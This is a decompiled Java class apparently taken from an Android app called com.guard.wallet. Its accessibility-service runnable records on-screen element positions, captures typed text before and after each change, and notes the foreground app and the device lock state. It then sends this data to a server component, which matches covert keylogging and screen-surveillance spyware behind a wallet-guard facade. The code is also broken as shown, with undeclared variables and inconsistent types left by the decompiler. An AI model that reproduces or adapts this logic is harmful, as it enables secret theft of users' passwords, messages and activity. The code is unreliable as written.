package o;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityRecord;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.Point;
import com.guard.wallet.msg.ReadEventMessage;
import com.guard.wallet.msg.ReadScreenEvent;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.AccessibilityEventStatVO;
import com.guard.wallet.stat.KeyboardEventVO;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicBoolean;

// $VF: synthetic class
public final class b0 implements Runnable {
   public final int a;
   public final Object b;
   public final Object c;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      int var1 = this.a;
      Runnable var3 = null;
      Semaphore var4 = null;
      MessageRecordVO var2 = (MessageRecordVO)this.b;
      AccessibilityRecord var5 = (AccessibilityRecord)this.c;
      switch (var1) {
         case 0:
            c0 var41 = (c0)var5;
            var5 = (AccessibilityEvent)var2;
            AtomicBoolean var42 = var41.c;

            label190: {
               Exception var49;
               label199: {
                  try {
                     var42.set(true);
                  } catch (Exception var23) {
                     var49 = var23;
                     boolean var60 = false;
                     break label199;
                  }

                  ReadScreenEvent var32 = var3;
                  if (var5 != null) {
                     var32 = var3;

                     try {
                        if (var5.getSource() != null) {
                           var32 = new ReadScreenEvent(var5.getEventType());
                           AccessibilityNodeInfo var47 = var5.getSource();
                           Rect var45 = new Rect();
                           var47.getBoundsInScreen(var45);
                           com.guard.wallet.helper.a.c(var45);
                           List var48 = var32.getPoints();
                           Point var7 = new Point(var45.exactCenterX(), var45.exactCenterY());
                           var48.add(var7);
                        }
                     } catch (Exception var22) {
                        Exception var33 = var22;

                        try {
                           a1.q.s("o.c0", var33);
                        } catch (Exception var21) {
                           var49 = var21;
                           boolean var61 = false;
                           break label199;
                        }

                        var32 = var3;
                     }
                  }

                  if (var32 == null) {
                     break label190;
                  }

                  try {
                     ReadEventMessage var39 = new ReadEventMessage(var32);
                     var34 = com.guard.wallet.utils.h.N(var39);
                     if (Integer.valueOf(com.guard.wallet.server.c.G().z.size()) > 0) {
                        com.guard.wallet.server.c.G().I(var34);
                     }
                  } catch (Exception var20) {
                     var49 = var20;
                     boolean var62 = false;
                     break label199;
                  }

                  try {
                     if (a1.q.z()) {
                        a1.q.F(var34);
                     }
                     break label190;
                  } catch (Exception var19) {
                     var49 = var19;
                     boolean var63 = false;
                  }
               }

               Exception var35 = var49;
               a1.q.s("o.c0", var35);
            }

            var42.set(false);
            return;
         case 1:
            MyAccessibilityService var6 = (MyAccessibilityService)var5;
            var5 = (AccessibilityEvent)var2;
            var2 = MyAccessibilityService.p;
            var6.getClass();
            if (var5 != null) {
               Exception var10000;
               label201: {
                  try {
                     if (var5.getEventType() <= 0) {
                        return;
                     }
                  } catch (Exception var18) {
                     var10000 = var18;
                     boolean var10001 = false;
                     break label201;
                  }

                  label159: {
                     try {
                        if (var5.getPackageName() != null) {
                           var2 = var5.getPackageName().toString();
                           break label159;
                        }
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var50 = false;
                        break label201;
                     }

                     var2 = null;
                  }

                  label149: {
                     try {
                        if (var5.getClassName() != null) {
                           var37 = var5.getClassName().toString();
                           break label149;
                        }
                     } catch (Exception var16) {
                        var10000 = var16;
                        boolean var51 = false;
                        break label201;
                     }

                     var37 = null;
                  }

                  try {
                     if (Objects.equals(var2, "com.android.systemui")
                        && !Objects.equals(16, var5.getEventType())
                        && !Objects.equals(8192, var5.getEventType())
                        && !var6.k((String)var2)) {
                        return;
                     }
                  } catch (Exception var15) {
                     var10000 = var15;
                     boolean var52 = false;
                     break label201;
                  }

                  label202: {
                     try {
                        if (MainApplication.getInstance() == null) {
                           return;
                        }

                        MainApplication.getInstance().offerAccessibilityEvent(var5.getEventType());
                        var46 = new AccessibilityEventStatVO();
                        var46.setContainerCode("ACCESSIBILITY_CONTAINER");
                        var46.setActivePackageName((String)MyAccessibilityService.u.get());
                        var46.setActiveWindowClassName((String)MyAccessibilityService.v.get());
                        var46.setEventPackageName((String)var2);
                        var46.setEventClassName(var37);
                        var46.setEventValue(var5.getEventType());
                        if (!Objects.equals(16, var5.getEventType()) && !Objects.equals(8192, var5.getEventType())) {
                           break label202;
                        }
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var53 = false;
                        break label201;
                     }

                     label127: {
                        try {
                           var38 = new KeyboardEventVO();
                           if (var5.getEventType() == 16 && var5.getBeforeText() != null) {
                              var2 = var5.getBeforeText().toString();
                              break label127;
                           }
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var54 = false;
                           break label201;
                        }

                        var2 = null;
                     }

                     try {
                        var38.setBeforeText((String)var2);
                     } catch (Exception var11) {
                        var10000 = var11;
                        boolean var55 = false;
                        break label201;
                     }

                     var2 = var4;

                     label197: {
                        try {
                           if (var5.getSource() == null) {
                              break label197;
                           }
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var56 = false;
                           break label201;
                        }

                        var2 = var4;

                        try {
                           if (var5.getSource().getText() != null) {
                              var2 = var5.getSource().getText().toString();
                           }
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var57 = false;
                           break label201;
                        }
                     }

                     try {
                        var38.setEditText((String)var2);
                        var38.setEventText(MyAccessibilityService.E((AccessibilityEvent)var5));
                        var46.setKeyboardEvent(var38);
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var58 = false;
                        break label201;
                     }
                  }

                  try {
                     var2 = com.guard.wallet.utils.g.B0();
                     var46.setIsDeviceLocked(((LockPatternVO)var2).getIsDeviceLocked());
                     var46.setIsDeviceSecure(((LockPatternVO)var2).getIsDeviceSecure());
                     var2 = new MessageRecordVO();
                     var2.setIntentCode("android.accessibility.service.USAGE_SUMMARY");
                     var2.setExtraBody(var46);
                     if (MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                        MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
                     }

                     return;
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var59 = false;
                  }
               }

               Exception var29 = var10000;
               a1.q.s("statAccessibilityEvent", var29);
            }

            return;
         default:
            var3 = (Runnable)var5;
            var4 = (Semaphore)var2;
            var2 = f0.j.f;
            var3.run();
            var4.release();
      }
   }
}
